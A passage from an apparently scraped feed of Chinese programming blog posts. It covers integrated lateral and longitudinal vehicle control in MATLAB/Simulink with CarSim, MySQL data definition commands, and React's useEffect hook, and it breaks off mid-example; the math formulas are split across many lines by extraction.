p
​
=
x
˙
r
​
(
t
)
2
+
y
˙
​
r
​
(
t
)
2
​
期望加速度
a p a_p
a
p
​
为
a p = x ¨ r ( t ) 2 + y ¨ r ( t ) 2 a_p=\sqrt{\ddot{x}_r(t)^2+\ddot{y}_r(t)^2}
a
p
​
=
x
¨
r
​
(
t
)
2
+
y
¨
​
r
​
(
t
)
2
​
这里混用了
( x ( t ) , y ( t ) ) (x(t),y(t))
(
x
(
t
)
,
y
(
t
))
和
( x r ( t ) , y r ( t ) ) (x_r(t),y_r(t))
(
x
r
​
(
t
)
,
y
r
​
(
t
))
，他们其实是一回事，在规划模块里规划轨迹是
( x ( t ) , y ( t ) ) (x(t),y(t))
(
x
(
t
)
,
y
(
t
))
，到控制模块时轨迹就变成了
( x r ( t ) , y r ( t ) ) (x_r(t),y_r(t))
(
x
r
​
(
t
)
,
y
r
​
(
t
))
，其实是一回事儿。这样从规划到控制的理论部分就讲完了。
把整个规划和控制逻辑梳理一下，首先通过规划得到
x ( t ) , y ( x ) x(t),y(x)
x
(
t
)
,
y
(
x
)
，然后通过这两个可以得到
x ( t ) , y ( t ) , y ( x ) x(t),y(t),y(x)
x
(
t
)
,
y
(
t
)
,
y
(
x
)
，得到这三个的同时也可以得到各阶导数
x ˙ ( t ) , y ˙ ( t ) , y ′ ( x ) \dot x(t),\dot y(t),y'(x)
x
˙
(
t
)
,
y
˙
​
(
t
)
,
y
′
(
x
)
，
x ¨ ( t ) , y ¨ ( t ) , y ′ ′ ( x ) \ddot x(t),\ddot y(t),y''(x)
x
¨
(
t
)
,
y
¨
​
(
t
)
,
y
′′
(
x
)
。
4.3 横向控制的实现与调整
由此可得横向控制公式：
x r ( t ) = x ( t ) y r ( t ) = y ( t ) θ r ( t ) = arctan ⁡ [ y ′ [ x ( t ) ] ] κ r ( t ) = y ′ ′ [ x ( t ) ] ( 1 + y ′ [ x ( t ) ] 2 ) 3 2 \begin{aligned} x_r\left( t \right) &amp;=x\left( t \right)\\ y_r\left( t \right) &amp;=y\left( t \right)\\ \theta _r\left( t \right) &amp;=\arctan \left[ y'\left[ x\left( t \right) \right] \right]\\ \kappa _r\left( t \right) &amp;=\frac{y''\left[ x\left( t \right) \right]}{\left( 1+y'\left[ x\left( t \right) \right] ^2 \right) ^{\frac{3}{2}}}\\ \end{aligned}
x
r
​
(
t
)
y
r
​
(
t
)
θ
r
​
(
t
)
κ
r
​
(
t
)
​
=
x
(
t
)
=
y
(
t
)
=
arctan
[
y
′
[
x
(
t
)
]
]
=
(
1
+
y
′
[
x
(
t
)
]
2
)
2
3
​
y
′′
[
x
(
t
)
]
​
​
4.4 纵向控制与规划接口的整合
以及纵向控制公式：
e s = d ⃗ e r r ⋅ τ ⃗ s ˙ = 1 1 − κ r e d ( v x cos ⁡ e φ − v y sin ⁡ e φ ) v p = x ˙ ( t ) 2 + y ˙ ( t ) 2 e v = v p − s ˙ a p = x ¨ ( t ) 2 + y ¨ ( t ) 2 \begin{aligned} e_s&amp;=\vec{d}e_{rr}\cdot \vec{\tau}\\ \dot{s}&amp;=\frac{1}{1-\kappa _re_d}\left( v_x\cos e_{\varphi}-v_y\sin e_{\varphi} \right)\\ v_p&amp;=\sqrt{\dot{x}\left( t \right) ^2+\dot{y}\left( t \right) ^2}\\ e_v&amp;=v_p-\dot{s}\\ a_p&amp;=\sqrt{\ddot{x}\left( t \right) ^2+\ddot{y}\left( t \right) ^2}\\ \end{aligned}
e
s
​
s
˙
v
p
​
e
v
​
a
p
​
​
=
d
e
rr
​
⋅
τ
=
1
−
κ
r
​
e
d
​
1
​
(
v
x
​
cos
e
φ
​
−
v
y
​
sin
e
φ
​
)
=
x
˙
(
t
)
2
+
y
˙
​
(
t
)
2
​
=
v
p
​
−
s
˙
=
x
¨
(
t
)
2
+
y
¨
​
(
t
)
2
​
​
其中，纵向误差
e s e_s
e
s
​
输入至纵向控制要加负号，
e v e_v
e
v
​
为速度误差，
a p a_p
a
p
​
为期望加速度。
纵向控制中的
e s e_s
e
s
​
、
s ˙ \dot s
s
˙
是通过横向控制计算出来的，所以纵向控制需要输入的只有三个。
五、代码实现与模型调整
5.1 代码下载与准备工作
这样理论部分就讲完了，接下来就是重头戏代码环节。
首先把横向控制和纵向控制的代码以及模型给下载下来，链接如下：
自动驾驶横纵向控制代码和模型
5.2 Matlab 环境配置
把代码和模型全部都复制到
Casim
工作目录上，然后打开
Matlab
，
Matlab
共有四个 .
m m
m
文件，前三个是标定用的，.
m m
m
文件是第十一节里的，最后是第八节的
LQR
。可以注意到无论是
Q Q
Q
还是
C f , C r C_f,C_r
C
f
​
,
C
r
​
都变了，不是第八讲
LQR
了，这里要改一下，因为横纵向控制的
LQR
容易出现很大偏差，所以需要更精确的
LQR
，不能就是像第八节那样随便混一下。
侧偏刚度需要精确解，必须要算出每个轮子精确的垂向力，通过垂向力查表，根据曲线大概估算出侧偏刚度。
重新设置新的模型
planning_control
，就不要用以前的模型了，在新的模型里，输入就是油门、刹车以及四轮的转角，输出就是
x , y , φ , v x , v y , φ ˙ x,y,\varphi,v_x,v_y,\dot \varphi
x
,
y
,
φ
,
v
x
​
,
v
y
​
,
φ
˙
​
以及发动机转速。
5.3 Carsim 标定过程
首先做标定，把那三个标定代码跑起来，得到标定表。先不急着把横向控制模型复制进来，如果拿到代码，应该没有油门刹车标定表，所以要先标定一下，而且标定时要把
Carsim
当时的输出
x , y , φ , v x , v y , φ ˙ x,y,\varphi,v_x,v_y,\dot \varphi
x
,
y
,
φ
,
v
x
​
,
v
y
​
,
φ
˙
​
改为标定时的输出，只有
v x , a x v_x,a_x
v
x
​
,
a
x
​
以及发动机转速，并且要先从初始条件
0 0
0
开始标定油门，然后把初速度改成
180 k m / h 180km/h
180
km
/
h
，再标定刹车。标完后再把
Carsim
的输出改成
x , y , φ , v x , v y , φ ˙ x,y,\varphi,v_x,v_y,\dot \varphi
x
,
y
,
φ
,
v
x
​
,
v
y
​
,
φ
˙
​
以及发动机转速。
5.4 Simlink 模型建立
再建立新的
Simlink
空模型，用
Carsim
把空模型关联上去，最后把仿真的时间给改一下，改成
40 40
40
秒，因为希望仿真时间长一点。然后把纵向控制的模型（就是第十一节的模型）打开，把里面所有的东西都复制到新的空模型里。
5.5 纵向控制模型整合与参数优化
先不急着把横向控制模型复制进来，应该先做标定，先把那三份标定代码给跑起来，可以得到标定表。标定时要把
Carsim
的输入和输出，改为标定时的输入和输出：
输入为油门、刹车
输出为
v x v_x
v
x
​
、
a x a_x
a
x
​
以及发动机转速
并且要先从初始速度为
0 0
0
开始标定油门，然后再改为初速度
180 k m / h 180km/h
180
km
/
h
，再标定刹车。标完之后再把
Carsim
的输出改为
x , y , φ , v x , v y , φ ˙ x,y,\varphi,v_x,v_y,\dot \varphi
x
,
y
,
φ
,
v
x
​
,
v
y
​
,
φ
˙
​
以及发动机转速。
得到标定表后，把注释取消掉，把纵向双
PID
弄好。
可以把位置
PID
的输入删掉，因为输入
e s e_s
e
s
​
在横向控制里直接给，所以不需要用加减计算出来。
把纵向控制所需要的输入先断开，用红色线起个名字再打包，这样看起来不那么混乱，因为模型很复杂，所以能打包的尽量就打包。
纵向控制需要车的当前速度作为电机模型的输入，所以把速度写一下，写个函数：
function
v
=
fcn
(
vx
,
vy
)
v
=
sqrt
(
vx
^
2
+
vy
^
2
)
;
写好后连起来，规划函数如下：
MATLAB Function：planning
function
[
vp
,
ap
,
xr
,
yr
,
thetar
,
kr
]
=
fcn
(
t
)
dx
=
100
;
%30 秒，要向前移动 100 米，然后向左移动 10 米。
dy
=
10
;
T
=
30
;
xstart
=
[
0
,
0
,
0
]
;
%起点到终点的位置、速度、加速度
xend
=
[
dx
,
0
,
0
]
;
ystart
=
[
0
,
0
,
0
]
;
yend
=
[
dy
,
0
,
0
]
;
a
=
zeros
(
1
,
6
)
;
%无论是 x 和y，都是五次多项式，有 6 个系数
b
=
zeros
(
1
,
6
)
;
a
(
1
)
=
xstart
(
1
)
;
a
(
2
)
=
xstart
(
2
)
;
a
(
3
)
=
xstart
(
3
)
/
2
;
A1
=
[
T
^
3
,
T
^
4
,
T
^
5
;
%解三元一次方程组
3
*
T
^
2
,
4
*
T
^
3
,
5
*
T
^
4
;
6
*
T
,
12
*
T
^
2
,
20
*
T
^
3
]
;
%注意在推导时，系数是从 A0 到A5，但是从代码的编写写的是 A1 到A6
%因为 Matlab 数组的下标是从一开始的，没有 A0
B1
=
[
xend
(
1
)
-
a
(
1
)
-
a
(
2
)
*
T
-
a
(
3
)
*
T
^
2
;
xend
(
2
)
-
a
(
2
)
-
2
*
a
(
3
)
*
T
;
xend
(
3
)
-
2
*
a
(
3
)
]
;
xs
=
inv
(
A1
)
*
B1
;
a
(
4
)
=
xs
(
1
)
;
a
(
5
)
=
xs
(
2
)
;
a
(
6
)
=
xs
(
3
)
;
b
(
1
)
=
ystart
(
1
)
;
b
(
2
)
=
ystart
(
2
)
;
b
(
3
)
=
ystart
(
3
)
/
2
;
A2
=
[
dx
^
3
,
dx
^
4
,
dx
^
5
;
%方程组的t变成dx
3
*
dx
^
2
,
4
*
dx
^
3
,
5
*
dx
^
4
;
6
*
dx
,
12
*
dx
^
2
,
20
*
dx
^
3
]
;
B2
=
[
yend
(
1
)
-
b
(
1
)
-
b
(
2
)
*
dx
-
b
(
3
)
*
dx
^
2
;
yend
(
2
)
-
b
(
2
)
-
2
*
b
(
3
)
*
dx
;
yend
(
3
)
-
2
*
b
(
3
)
]
;
ys
=
inv
(
A2
)
*
B2
;
b
(
4
)
=
ys
(
1
)
;
b
(
5
)
=
ys
(
2
)
;
b
(
6
)
=
ys
(
3
)
;
xr
=
a
(
1
)
+
a
(
2
)
*
t
+
a
(
3
)
*
t
^
2
+
a
(
4
)
*
t
^
3
+
a
(
5
)
*
t
^
4
+
a
(
6
)
*
t
^
5
;
yr
=
b
(
1
)
+
b
(
2
)
*
xr
+
b
(
3
)
*
xr
^
2
+
b
(
4
)
*
xr
^
3
+
b
(
5
)
*
xr
^
4
+
b
(
6
)
*
xr
^
5
;
xr_dot
=
a
(
2
)
+
2
*
a
(
3
)
*
t
+
3
*
a
(
4
)
*
t
^
2
+
4
*
a
(
5
)
*
t
^
3
+
5
*
a
(
6
)
*
t
^
4
;
yr_dx
=
b
(
2
)
+
2
*
b
(
3
)
*
xr
+
3
*
b
(
4
)
*
xr
^
2
+
4
*
b
(
5
)
*
xr
^
3
+
5
*
b
(
6
)
*
xr
^
4
;
yr_dot
=
yr_dx
*
xr_dot
;
thetar
=
atan
(
yr_dx
)
;
xr_dot2
=
2
*
a
(
3
)
+
6
*
a
(
4
)
*
t
+
12
*
a
(
5
)
*
t
^
2
+
20
*
a
(
6
)
*
t
^
3
;
yr_dx2
=
2
*
b
(
3
)
+
6
*
b
(
4
)
*
xr
+
12
*
b
(
5
)
*
xr
^
2
+
20
*
b
(
6
)
*
xr
^
3
;
yr_dot2
=
yr_dx2
*
xr_dot
^
2
+
yr_dx
*
xr_dot2
;
kr
=
yr_dx2
/
(
(
1
+
yr_dx
^
2
)
^
1.5
)
;
%曲率
vp
=
sqrt
(
xr_dot
^
2
+
yr_dot
^
2
)
;
if
xr_dot2
&gt;=
0
ap
=
sqrt
(
xr_dot2
^
2
+
yr_dot2
^
2
)
;
else
ap
=
-
sqrt
(
xr_dot2
^
2
+
yr_dot2
^
2
)
;
end
5.6 横向控制的集成与误差计算模块的修改
下面加入横向控制，把横向控制的核心代码拷进来。把单位换算去掉，因为在单位换算在外面已经做过了，所以就不需要再做了。把
( x r , y r , θ r , κ r ) (x_r,y_r,\theta_r,\kappa_r)
(
x
r
​
,
y
r
​
,
θ
r
​
,
κ
r
​
)
全都删掉，然后加接口进去，让
( x r , y r , θ r , κ r ) (x_r,y_r,\theta_r,\kappa_r)
(
x
r
​
,
y
r
​
,
θ
r
​
,
κ
r
​
)
从外面输入。
修改误差计算模块的代码，首先把
e s e_s
e
s
​
和
s ˙ \dot s
s
˙
输出出去，把
d m i n d_{min}
d
min
​
去掉，因为
( x r , y r , θ r , κ r ) (x_r,y_r,\theta_r,\kappa_r)
(
x
r
​
,
y
r
​
,
θ
r
​
,
κ
r
​
)
由外面的规划模块给，不是直接给定轨迹，找最距离最短的匹配点。误差计算模块修改如下：
function
[
kr
,
err
,
es
,
s_dot
]
=
fcn
(
x
,
y
,
phi
,
vx
,
vy
,
phi_dot
,
xr
,
yr
,
thetar
,
kappar
)
tor
=
[
cos
(
thetar
)
;
sin
(
thetar
)
]
;
nor
=
[
-
sin
(
thetar
)
;
cos
(
thetar
)
]
;
d_err
=
[
x
-
xr
;
y
-
yr
]
;
ed
=
nor
'
*
d_err
;
es
=
tor
'
*
d_err
;
%projection_point_thetar=thetar(dmin);%apollo
projection_point_thetar
=
thetar
+
kappar
*
es
;
ed_dot
=
vy
*
cos
(
phi
-
projection_point_thetar
)
+
vx
*
sin
(
phi
-
projection_point_thetar
)
;
%%%%%%%%%
ephi
=
sin
(
phi
-
projection_point_thetar
)
;
%%%%%%%%%
ss_dot
=
vx
*
cos
(
phi
-
projection_point_thetar
)
-
vy
*
sin
(
phi
-
projection_point_thetar
)
;
%两步算出来s_dot
s_dot
=
ss_dot
/
(
1
-
kappar
*
ed
)
;
ephi_dot
=
phi_dot
-
kappar
*
s_dot
;
kr
=
kappar
;
err
=
[
ed
;
ed_dot
;
ephi
;
ephi_dot
]
;
end
这样横向控制就做好了，连起来就可以了。转角算出来之后要做单元换算，把弧度转换为角度，后轮角度给写成
0 0
0
就行了，因为
LQR
是小角度，所以要加
− 1 -1
−
1
到
1 1
1
的限制，最后别忘了
e s e_s
e
s
​
要乘
− 1 -1
−
1
，因为
e s e_s
e
s
​
输入到纵向控制里要加负号。在纵向控制里再给加个
10 10
10
到
10 10
10
的限制，因为
e s e_s
e
s
​
也不希望过大。
一般实车调试的误差要小于
0.1 0.1
0.1
米，而仿真至少要达到厘米级，就是零点零几米
如果控制效果不好，一般就是加速度超了，所以首先要检查的就是加速度。
LQR
对低高速没有限制，但是必须要小转角，第一是小转角，第二就是加速度不能超了。一般加速度
2 2
2
到
3 3
3
，特别是高速情况下，想再有
4 4
4
到
5 5
5
的加速几乎不可能，因为在高速情况下，电机的加速能力就很差了。
六、横向误差大的原因
6.1 横向误差的原因分析
纵向误差一般不会特别大，如果大的话调
PID
参数就可以了，有问题的一般是横向误差，有以下几点原因：
侧偏刚度估算太准
而且在跑时，前轮和后轮的垂向力不一样，因为加速度会导致轴转移，垂向力不一样就会导致侧偏刚度变化。
LQR
模型的简化
是基于二自由度自行车模型，本身就有一定简化，所以并不能完全的模拟车辆的横向运动，本身就有一定误差，所以导致横向跟踪也会有一定的误差。
汽车转向不足的固有特性
转向不足导致横向控制存在一定误差。一般来说，在仿真误差达到厘米级就认为可以接受了。如果是实车，大概是
0.1 0.1
0.1
米左右也可以接受，因为仿真没有噪声，是理想情况，所以要对仿真的要求更严格一点。
6.2 仿真与实车的差别
但是实车情况不太可能像仿真那样，实际的汽车有以下几个特点：
汽车不是自行车模型
汽车运行时的侧偏刚度会变化
汽车都会有存在转向不足的问题
实车肯定要考虑到转向不足，所以如果自己搭建模型，也有可能会遇到横向误差太大的问题。
七、解决横向误差的办法
横向误差太大，该如何避免？
有以下三种方法：
调节LQR参数
把侧偏刚度估计准一点。
调整LQR的Q矩阵
如果横向误差太大，就需要调
Q Q
Q
矩阵，给横向误差
e d e_d
e
d
​
更大的惩罚值，如果
e d e_d
e
d
​
过大，就会给很大的惩罚值，这样就尽可能的让
e d e_d
e
d
​
收敛到
0 0
0
。
e φ e_\varphi
e
φ
​
是不太可能收敛到
0 0
0
的，因为
e φ e_\varphi
e
φ
​
稳态误差就是
− β -\beta
−
β
。所以只要把
e d e_d
e
d
​
的权重改大，但不能太大，否则导致超调。
处理转向不足
因为转向不足而导致的横向误差太大
八、转向不足及过度转向
下面讲一下转向不足以及过度转向，比如这里有辆车，直接用自行车模型表示：
如果给这样的前轮转角，理论上应该按照红色弧线行驶，但可能实际上并不是按红色轨迹跑，可能出现过度转向或转向不足，这是汽车本身的特性。
8.1 转向不足与过度转向的原因
为什么会发生转向不足或者过度转向呢？
这里简单解释一下，比如这里有一辆车：
要往左转，那么自然就会受到侧向力的作用，假设为
F y 1 F_{y 1}
F
y
1
​
和
F y 2 F_ {y2}
F
y
2
​
。如果
F y 1 F_{y 1}
F
y
1
​
和
F y 2 F_ {y2}
F
y
2
​
之间不相匹配，就会导致在车的质心处有力矩存在。
8.2 力矩平衡与转向特性
什么叫相匹配？什么叫不相匹配？
简单举个例子，比如这样的车：
前轮和后轮都受到力的作用，到质心的距离分别是
a a
a
和
b b
b
。
若
F 1 ⋅ a = F 2 ⋅ b F_1\cdot a=F_2\cdot b
F
1
​
⋅
a
=
F
2
​
⋅
b
，则力矩平衡，导致中心转向。
若
F 1 ⋅ a &gt; F 2 ⋅ b F_1\cdot a&gt;F_2\cdot b
F
1
​
⋅
a
&gt;
F
2
​
⋅
b
，则质心有正力矩，导致过度转向。
若
F 1 ⋅ a &lt; F 2 ⋅ b F_1\cdot a&lt;F_2\cdot b
F
1
​
⋅
a
&lt;
F
2
​
⋅
b
，则质心有负力矩，导致转向不足。
8.3 车辆设计与转向特性的关系
一般市面上买到的车基本上都是转向不足的，这是为了安全考虑。但是如果是赛车，一般会调教成中心转向，因为赛车需要更灵敏的转向，所以要调成中心转向。
为什么不调成过度转向呢？
因为车天生就有过度转向的趋势，即在高速情况下，
F 1 ⋅ a &gt; F 2 ⋅ b F_1\cdot a&gt;F_2\cdot b
F
1
​
⋅
a
&gt;
F
2
​
⋅
b
，这是轮胎的特性。
所以一般来说：
如果是转向不足，在高速下可能会变成中心转向
如果是中心转向，在高速下可能会变成过度转向
所以就没有必要调整成过度转向的，即使是赛车，也是中心转向为主。实车调试都有转向不足的问题，就会导致横向误差比较大。
8.4 使用 PID 控制器处理转向不足
那怎么去处理这件事情？
一般在模型里用
PID
，但只用
PID
的积分模块，其他项都是
0 0
0
，放到横向误差处做积分，因为有转向不足就会有误差，就对误差做积分，然后把误差积分和得到的转角相减，再输入到前轮转角，即将误差先做积分，再补偿到前轮转角中。
很容易理解，因为
e d e_d
e
d
​
向左误差为正，那么角度也是向左为正，所以一旦
e d e_d
e
d
​
为正，就意味着方向盘往左打多了，所以要减掉多打的角度。
注意弧度到角度的单位换算，应该是先做减法，再做单位换算。增益模块放到后面，对于实车来说，如果加了的话，提升会比较大。
因为转向不足做了只用积分的
PID
，积分参数可以自己调节。
九、总结
这样本系列就基本结束了，全部都讲完了。如果各位一直做到现在，可以发现，如果纯用
Matlab
确实不行，因为太慢了，特别是第
12 12
12
节的模型，实际上跑起来比较费时间，特别是要调的话，每调一次
PID
参数都要跑一次，都要费很多长时间。再加上只是纯控制模型，还没有把规划加进去。规划只是接口，给定起点、终点，然后算法自动规划一条曲线，车就按照规划路径跑，但这只是接口而已，还没有做真正的轨迹规划。
一旦把规划集成进去，运行会更慢，以后的进阶课程可能就不再以纯的
Matlab
为主了，可能只是用
Matlab
做简单的算法学习，真正要写能用的代码的话，肯定是要上
C++
的，以及用
Linux
的，这也是没办法的事情，因为快。
本系列博客正式结束了，感谢大家的阅读，谢谢大家，下个系列再见。
参考资料
【基础】自动驾驶控制算法第十二讲 横纵向综合控制(完结)
后记：
🌟 感谢您耐心阅读这篇关于
自动驾驶控制算法横纵向综合控制
的技术博客。 📚
🎯 如果您觉得这篇博客对您有所帮助，请不要吝啬您的
点赞和评论
📢
🌟您的支持是我继续创作的动力。同时，别忘了
收藏本篇博客
，以便日后随时查阅。🚀
🚗 让我们一起期待更多的技术分享，共同探索
移动机器人
的无限可能！💡
🎭
感谢您的支持与关注，让我们一起在知识的海洋中砥砺前行
🚀</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540182.html</guid><pubDate>Fri, 31 Oct 2025 07:27:29 +0000</pubDate></item><item><title>【MySQL】入门篇—SQL基础：数据定义语言（DDL）</title><link>https://www.ppmy.cn/news/1540183.html</link><description>数据定义语言（DDL，Data Definition Language）是SQL（结构化查询语言）的一部分，主要用于定义和管理数据库的结构。
DDL允许用户创建、修改和删除数据库及其对象（如表、索引、视图等）。以下是一些DDL在实际应用中的重要性和场景：
创建数据库和表
：在应用程序开发初期，需要设计和创建数据库结构以存储数据。例如，电商平台需要创建用户、商品和订单等表来管理数据。
修改数据库结构
：随着业务需求的变化，可能需要调整数据库结构，比如添加新字段、修改数据类型或删除不再需要的列。
删除数据库和表
：在不再需要某个数据库或表时，可以将其删除以释放资源。例如，当一个项目结束时，相关的测试数据库可能会被删除。
掌握DDL的基本操作是数据库管理员和开发者的基本技能。接下来，我们将通过具体示例详细介绍DDL的主要命令：创建（CREATE）、修改（ALTER）和删除（DROP）。
1. 创建数据库和表
1.1 创建数据库
创建数据库是指在数据库管理系统中创建一个新的数据库实例。每个数据库可以包含多个表和其他对象。创建数据库的语法相对简单，通常只需要指定数据库的名称。
示例：创建数据库
-- 创建一个名为 'my_database' 的数据库
CREATE DATABASE my_database;-- 选择使用该数据库
USE my_database;
CREATE DATABASE my_database;
：此命令创建一个名为
my_database
的数据库。数据库是存储数据的容器，通常一个应用程序会有一个或多个数据库。
USE my_database;
：选择当前使用的数据库。之后的所有操作（如创建表、插入数据等）都将在
my_database
中进行。
1.2 创建表
创建表是指在数据库中定义一个新的数据结构，用于存储特定类型的数据。每个表由行和列组成，行表示记录，列表示属性。表的设计需要考虑数据的完整性和约束条件。
示例：创建用户表
-- 创建一个名为 'users' 的表
CREATE TABLE users (id INT PRIMARY KEY AUTO_INCREMENT,  -- 用户ID，主键，自动递增username VARCHAR(50) NOT NULL,      -- 用户名，非空email VARCHAR(100) NOT NULL UNIQUE   -- 邮箱，非空且唯一
);
CREATE TABLE users (...)
：创建一个名为
users
的表。
id INT PRIMARY KEY AUTO_INCREMENT
：定义一个名为
id
的列，数据类型为整数（INT），作为主键并自动递增。主键确保每条记录的唯一性。
username VARCHAR(50) NOT NULL
：定义一个名为
username
的列，数据类型为变长字符串，最大长度为50，且不能为空（NOT NULL）。
email VARCHAR(100) NOT NULL UNIQUE
：定义一个名为
email
的列，数据类型为变长字符串，最大长度为100，且不能为空且唯一（UNIQUE），确保没有重复的邮箱地址。
2. 修改数据库和表
2.1 修改表结构
修改表结构是指对已存在的表进行更改，以适应新的业务需求。这可能包括添加新列、修改现有列的属性或删除不再需要的列。
示例：向表中添加新列
-- 向 'users' 表中添加一个新列 'created_at'
ALTER TABLE users ADD created_at DATETIME DEFAULT CURRENT_TIMESTAMP;
ALTER TABLE users
：指定要修改的表为
users
。
ADD created_at DATETIME DEFAULT CURRENT_TIMESTAMP
：添加一个名为
created_at
的新列，数据类型为日期时间（DATETIME），默认值为当前时间戳（CURRENT_TIMESTAMP）。这个列用于记录用户创建的时间。
2.2 修改现有列
修改现有列是指更改表中已存在列的定义，例如改变数据类型或约束条件。这通常是在业务需求变化时进行的调整。
示例：修改列的数据类型
-- 修改 'username' 列的长度
ALTER TABLE users MODIFY username VARCHAR(100) NOT NULL;
MODIFY username VARCHAR(100) NOT NULL
：将
username
列的数据类型修改为最大长度100的变长字符串，并保持非空约束。这种修改可能是因为我们希望允许更长的用户名。
2.3 删除列
删除列是指从表中移除一个不再需要的列。这通常是在数据结构优化或业务需求变化时进行的。
示例：从表中删除列
-- 从 'users' 表中删除 'created_at' 列
ALTER TABLE users DROP COLUMN created_at;
DROP COLUMN created_at
：从
users
表中删除名为
created_at
的列。如果我们不再需要记录用户创建时间，可以使用此命令进行删除。
3. 删除数据库和表
3.1 删除表
删除表是指从数据库中完全移除一个表及其所有数据。此操作是不可逆的，执行后无法恢复。
示例：删除表
-- 删除 'users' 表
DROP TABLE users;
DROP TABLE users;
：删除名为
users
的表及其所有数据。此操作不可逆，执行后无法恢复，因此在执行之前应确保该表的数据不再需要。
3.2 删除数据库
删除数据库是指从数据库管理系统中移除一个数据库及其所有表和数据。此操作也不可逆，需谨慎使用。
示例：删除数据库
-- 删除 'my_database' 数据库
DROP DATABASE my_database;
DROP DATABASE my_database;
：删除名为
my_database
的数据库及其所有表和数据。删除数据库会清空所有数据，因此需谨慎操作。
结论
数据定义语言（DDL）是管理数据库结构的关键工具。通过创建、修改和删除数据库及其对象，开发者和数据库管理员能够灵活地设计和维护数据存储结构。掌握DDL的基本命令对于有效地管理和优化数据库至关重要。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540183.html</guid><pubDate>Fri, 31 Oct 2025 07:27:32 +0000</pubDate></item><item><title>React中useEffect钩子</title><link>https://www.ppmy.cn/news/1540184.html</link><description>副作用：渲染以外的操作：像后端获取数据、操作DOM
参数：副作用方法、依赖（改变时重新执行）
调用时间：渲染JSX之后/依赖改变
useEffect
是 React 中的一个 Hook，用于在函数组件中执行副作用操作。副作用操作包括数据获取、订阅或手动更改 React 组件中的 DOM 等。
useEffect
使得在函数组件中处理这些操作变得简单而强大。
基本用法
useEffect
接受一个函数和一个依赖数组作为参数。当依赖数组中的任何值发生变化时，该函数将被重新执行。如果没有提供依赖数组，则该函数将在每次渲染后执行。
import React, { useState, useEffect } from 'react';  function Example() {  const [count, setCount] = useState(0);  useEffect(() =&gt; {  // 副作用操作  document.title = `You clicked ${count} times`;  // 清理函数（可选）  return () =&gt; {  // 组件卸载或依赖项变化前执行的清理操作  console.log('Clean up');  };  }, [count]); // 只有当 count 变化时，副作用操作才会重新执行  return (  &lt;div&gt;  &lt;p&gt;You clicked {count} times&lt;/p&gt;  &lt;button onClick={() =&gt; setCount(count + 1)}&gt;  Click me  &lt;/button&gt;  &lt;/div&gt;  );  
}
详解
副作用函数
：
useEffect
第一个参数是一个函数，该函数中包含了所有副作用操作。
这些操作可以是数据获取、订阅外部数据源、手动操作 DOM 等。
依赖数组
：
第二个参数是一个依赖数组（依赖项）。
当数组中的某个依赖项发生变化时，副作用函数会重新执行。
如果省略这个数组，副作用函数会在每次渲染后执行。
清理函数
：
副作用函数可以返回一个函数，这个函数会在组件卸载或下次副作用执行前执行。
常用于取消订阅、清除计时器、还原之前的手动 DOM 操作等。
空依赖数组
：
如果依赖数组为空
[]
，则副作用函数只会在组件挂载和卸载时执行一次。
这类似于类组件中的
componentDidMount
和
componentWillUnmount
。
多个
useEffect
：
你可以在一个组件中使用多个
useEffect
来分离不同的副作用逻辑。
每个
useEffect
都可以有自己的依赖数组和清理函数。
注意事项
避免在副作用函数中直接修改状态
：
副作用函数应该只包含副作用操作，如数据获取、订阅等。
状态更新应该通过事件处理函数或其他 React 机制来进行。
确保清理函数无副作用
：
清理函数中的操作应该是幂等的，即多次执行相同操作不会改变状态或导致错误。
依赖项要准确
：
确保依赖数组包含所有影响副作用函数行为的变量，以避免不必要的副作用执行。
示例
以下是一个包含多个
useEffect
的示例，分别处理数据获取和手动 DOM 操作：
import React, { useState, useEffect } from 'react';  function DataFetcher() {  const [data, setData] = useState(null);  const [input, setInput] = useState('');  useEffect(() =&gt; {  // 数据获取副作用  fetch(`https://api.example.com/data?query=${input}`)  .then(response =&gt; response.json())  .then(result =&gt; setData(result))  .catch(error =&gt; console.error('Error fetching data:', error));  }, [input]); // 仅在 input 变化时重新获取数据  useEffect(() =&gt; {  // 手动 DOM 操作副作用  const element = document.getElementById('focusElement');  if (element) {  element.focus();  }  // 清理函数  return () =&gt; {  if (element) {  element.blur();  }  };  }, []); // 只在组件挂载和卸载时执行  return (  &lt;div&gt;  &lt;input  type="text"  value={input}  onChange={e =&gt; setInput(e.target.value)}  placeholder="Search..."  /&gt;  {data ? (  &lt;div&gt;  &lt;h1&gt;{data.title}&lt;/h1&gt;  &lt;p&gt;{data.description}&lt;/p&gt;  &lt;input id="focusElement" type="text" placeholder="Auto-focused" /&gt;  &lt;/div&gt;  ) : (  &lt;p&gt;Loading...&lt;/p&gt;  )}  &lt;/div&gt;  );  
}
useEffect
是 React 函数组件中的一个 Hook，用于执行副作用操作。副作用操作是那些不在 React 渲染过程中的操作，比如数据获取、订阅外部数据源、手动更改 DOM 等。
useEffect
使得在函数组件中处理这些操作变得简单而强大。
useEffect 的基本用法
useEffect
接受一个函数（副作用函数）和一个依赖数组作为参数。当依赖数组中的任何值发生变化时，副作用函数会重新执行。如果省略依赖数组，副作用函数会在每次组件渲染后都执行。
useEffect(() =&gt; {  // 副作用操作  return () =&gt; {  // 清理操作（可选）  };  
}, [dependency1, dependency2, ...]); // 依赖数组
依赖数组
依赖数组是
useEffect
的第二个参数，它是一个包含依赖项的数组。这些依赖项通常是组件的状态变量或 props。当数组中的任何一个依赖项发生变化时，React 会重新调用
useEffect
中的副作用函数。
如果依赖数组为空
（
[]
），则副作用函数只会在组件挂载（
componentDidMount
等效）和卸载（
componentWillUnmount
等效）时执行一次。
如果依赖数组包含状态变量或 props
，则每当这些依赖项变化时，副作用函数会重新执行。
注意事项
副作用函数内部不应该直接修改状态或触发其他副作用，因为这可能会导致无限循环或其他难以调试的问题。状态更新应该通过事件处理函数或其他 React 机制来进行。
清理函数（
useEffect
返回的函数）用于在副作用函数执行完毕后进行清理操作，比如取消订阅、清除计时器等。它会在组件卸载或下次副作用执行前执行。
依赖数组应该包含所有影响副作用函数行为的变量，以避免不必要的副作用执行。
示例
以下是一个使用
useEffect
和依赖数组的示例，用于在组件挂载时获取数据，并在数据变化时更新 UI
